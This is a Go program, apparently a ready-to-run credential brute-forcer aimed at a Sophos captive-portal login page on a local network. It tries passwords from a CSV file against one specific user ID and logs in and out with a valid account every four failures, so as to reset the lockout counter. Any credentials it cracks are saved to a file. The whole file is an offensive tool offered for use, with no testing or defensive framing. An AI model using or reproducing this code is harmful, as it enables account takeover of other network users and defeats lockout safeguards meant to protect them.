package main

import (
	"encoding/csv"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	loginURL  = "http://172.16.68.6:8090/login.xml"
	logoutURL = "http://172.16.68.6:8090/logout.xml"
)

type Requestresponse struct {
	XMLName       xml.Name `xml:"requestresponse"`
	Text          string   `xml:",chardata"`
	Status        string   `xml:"status"`
	Message       string   `xml:"message"`
	Logoutmessage string   `xml:"logoutmessage"`
	State         string   `xml:"state"`
}

func sendPostRequest(url, body string) (string, error) {
	reqBody := strings.NewReader(body)
	resp, err := http.Post(url, "application/x-www-form-urlencoded", reqBody)
	if err != nil {
		return "", fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %v", err)
	}

	return string(respBody), nil
}

func login(username, password string) (*Requestresponse, error) {
	body := fmt.Sprintf("mode=191&username=%s&password=%s", username, password)
	response, err := sendPostRequest(loginURL, body)
	if err != nil {
		return nil, err
	}

	var parsedResponse Requestresponse
	err = xml.Unmarshal([]byte(response), &parsedResponse)
	if err != nil {
		return nil, fmt.Errorf("error parsing XML response: %v", err)
	}

	if !strings.Contains(parsedResponse.Message, "You are signed in as") {
		return &parsedResponse, fmt.Errorf("error logging in")
	}

	return &parsedResponse, nil
}

func logout(username string) (*Requestresponse, error) {
	body := fmt.Sprintf("mode=193&username=%s", username)
	response, err := sendPostRequest(logoutURL, body)
	if err != nil {
		return nil, err
	}

	var parsedResponse Requestresponse
	err = xml.Unmarshal([]byte(response), &parsedResponse)
	if err != nil {
		return nil, fmt.Errorf("error parsing XML response: %v", err)
	}

	if !strings.Contains(parsedResponse.Message, "You&#39;ve signed out") {
		return &parsedResponse, fmt.Errorf("error logging out")
	}

	return &parsedResponse, nil
}

func resetLogins(correctUsername, correctPassword string) error {
	_, err := login(correctUsername, correctPassword)
	if err != nil {
		return err
	}
	log.Println("Logged in as", correctUsername)
	time.Sleep(2 * time.Second)

	_, err = logout(correctUsername)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	// Retrieve username and password from environment variables
	correctUsername := os.Getenv("SOPHOS_USERNAME")
	correctPassword := os.Getenv("SOPHOS_PASSWORD")

	if correctUsername == "" || correctPassword == "" {
		log.Fatalln("Environment variables SOPHOS_USERNAME and SOPHOS_PASSWORD must be set")
	}

	currDir, err := os.Getwd()
	if err != nil {
		log.Fatalln(err)
	}

	passwordFile, err := os.OpenFile(filepath.Join(currDir, "passwords.csv"), os.O_RDONLY, 0600)
	if err != nil {
		log.Panicln(err)
	}
	defer passwordFile.Close()

	csvReader := csv.NewReader(passwordFile)
	passwords, err := csvReader.ReadAll()
	if err != nil {
		log.Panicln(err)
	}

	csvFile, err := os.OpenFile(filepath.Join(currDir, "matched.csv"), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	if err != nil {
		log.Panicln(err)
	}
	defer csvFile.Close()

	csvWriter := csv.NewWriter(csvFile)
	defer csvWriter.Flush()

	var wrongAttempts int
	userID := 19102158 // Example user ID for brute-force attack

	for _, pwd := range passwords {
		if wrongAttempts >= 4 {
			wrongAttempts = 0
			err := resetLogins(correctUsername, correctPassword)
			if err != nil {
				log.Fatalln(err)
			}
		}

		username := fmt.Sprintf("%d", userID)
		password := pwd[0]

		fmt.Printf("Trying username: %s with password: %s\n", username, password)
		res, err := login(username, password)
		if err != nil {
			log.Println(err)
			wrongAttempts++
			continue
		} else {
			_, err = logout(username)
			if err != nil {
				log.Println(err)
			}
			err = csvWriter.Write([]string{username, password})
			if err != nil {
				log.Fatalln(err)
			}
			csvWriter.Flush()
			fmt.Println("Login successful:", res)
			break
		}
	}
}

